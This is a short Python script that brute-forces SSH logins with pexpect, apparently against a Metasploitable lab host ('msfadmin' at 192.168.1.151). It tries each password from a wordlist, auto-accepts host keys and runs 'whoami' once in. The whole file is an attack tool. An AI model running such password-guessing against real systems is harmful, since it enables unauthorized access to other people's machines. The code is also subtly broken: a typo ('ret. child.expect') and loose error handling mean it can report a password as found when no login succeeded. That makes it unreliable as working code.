#!/usr/bin/python

import pexpect

PROMPT = ["# ", ">>> ", "> ", "\$ "]

def send_command(connection, command):
        connection.sendline(command)
        connection.expect(PROMPT)
        print(connection.before)

def connect(user, host, password):
	ssh_newkey = "Are you sure you want to continue connecting"
	connStr = 'ssh -oHostKeyAlgorithms=+ssh-dss ' + user + "@" + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
	if ret == 0:
		print("[-] Error connecting")
		return
	if ret == 1:
		child.sendline("yes")
		ret. child.expect([pexpect.TIMEOUT, "[P|p]assword"])
		if ret == 0:
			print("[-] Error connecting")
			return
	child.sendline(password)
	child.expect(PROMPT, timeout=0.5)
	return child

def main():
	host = "192.168.1.151"
	user = "msfadmin"
	file = open("pswds.txt", "r")
	for password in file.readlines():
		try:
			child = connect(user, host, password.strip("\n"))
			print("[+] Password found: " + password)
			send_command(child, "whoami")
			return
		except:
			print("[-] Password incorrect: " + password)


main()
